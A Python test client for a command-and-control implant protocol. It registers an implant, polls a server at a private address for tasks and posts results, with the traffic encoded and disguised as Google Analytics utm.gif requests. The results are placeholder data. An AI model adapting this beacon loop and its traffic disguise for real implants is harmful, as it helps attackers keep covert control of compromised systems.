import base64
import json
import time

import msgpack
import requests

PORT = 8028
URL = f"http://10.0.0.30:{PORT}/___utm.gif"
POST_URL = f"http://10.0.0.30:{PORT}/__utm.gif"


def urlsafe_b64encode_dict(data: dict) -> str:
    """
    Encode a dictionary to URL-safe Base64 without padding.
    """
    json_bytes = json.dumps(data).encode("utf-8")
    encoded = base64.urlsafe_b64encode(json_bytes).rstrip(b"=")
    return encoded.decode("utf-8")


def register() -> str:
    # send register metadata with 00000000-0000-0000-0000-00000000000
    headers = {
        "utmcc": "gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
    }
    try:
        r = requests.get(URL, headers=headers, timeout=5)
        if r.status_code == 204:
            print("No task available (204)")
            return None
        r.raise_for_status()
        task = r.content  # r.text == str
        print(task)  # task is in bytes
        # de msgpack
        try:
            task = msgpack.unpackb(task)
            implant_uuid = task.get("implant_uuid")
            print(implant_uuid)
            print(task)
            # task_uuid = r.json().get("task_uuid")
            if not implant_uuid:
                print("No implant_uuid in response")
            return implant_uuid

        except ValueError:
            print("Response is not valid JSON")
            return None
    except requests.RequestException as e:
        print(f"Error fetching task: {e}")
        return None


def get_task(implant_uuid):

    metadata = {"implant_uuid": implant_uuid}
    # msgpack
    msgpack_metadata = msgpack.packb(metadata)

    # then base64
    metadata_bytes = base64.urlsafe_b64encode(msgpack_metadata).rstrip(b"=")

    print(metadata_bytes)
    # send metadata
    headers = {"utmcc": metadata_bytes}
    try:
        r = requests.get(URL, headers=headers, timeout=5)
        if r.status_code == 204:
            print("No task available (204)")
            return None
        r.raise_for_status()
        task = r.content  # r.text == str
        print(task)  # task is in bytes
        # de msgpack
        try:
            task = msgpack.unpackb(task)
            task_uuid = task.get("task_uuid")
            print(task)
            # task_uuid = r.json().get("task_uuid")
            if not task_uuid:
                print("No task UUID in response")
            return task_uuid
        except ValueError:
            print("Response is not valid JSON")
            return None
    except requests.RequestException as e:
        print(f"Error fetching task: {e}")
        return None


def send_task_response(implant_uuid: str, task_uuid: str):
    if not task_uuid:
        print("No task UUID to respond to")
        return

    task_response = {
        "task_uuid": task_uuid,
        "implant_uuid": implant_uuid,
        "result": {"data_type": "test", "data": "somedata"},
    }

    print(f"queued task response (pre-encode): {task_response}")

    # msgpack, then base64
    task_response_msgpack = msgpack.packb(task_response)
    print(task_response_msgpack)
    # convert msgpackbytes to base64, then into str
    encoded_str = (
        base64.urlsafe_b64encode(task_response_msgpack).rstrip(b"=")
    ).decode()
    print(encoded_str)
    # encoded_str = urlsafe_b64encode_dict(task_response_msgpack)
    headers = {"utmcc": encoded_str}

    try:
        r = requests.get(
            f"{POST_URL}?utmac={implant_uuid}",
            headers=headers,
            timeout=5,
        )
        if r.status_code == 400:
            print(f"Server rejected task response (400): {r.text}")
        elif r.status_code == 204:
            print(f"Server accepted response, no content (204): {r.text}")
        else:
            print(f"Server responded: {r.status_code}")
    except requests.RequestException as e:
        print(f"Error sending task response: {e}")


if __name__ == "__main__":
    implant_uuid = register()

    while True:
        task_uuid = get_task(implant_uuid=implant_uuid)
        send_task_response(implant_uuid=implant_uuid, task_uuid=task_uuid)
        time.sleep(10)
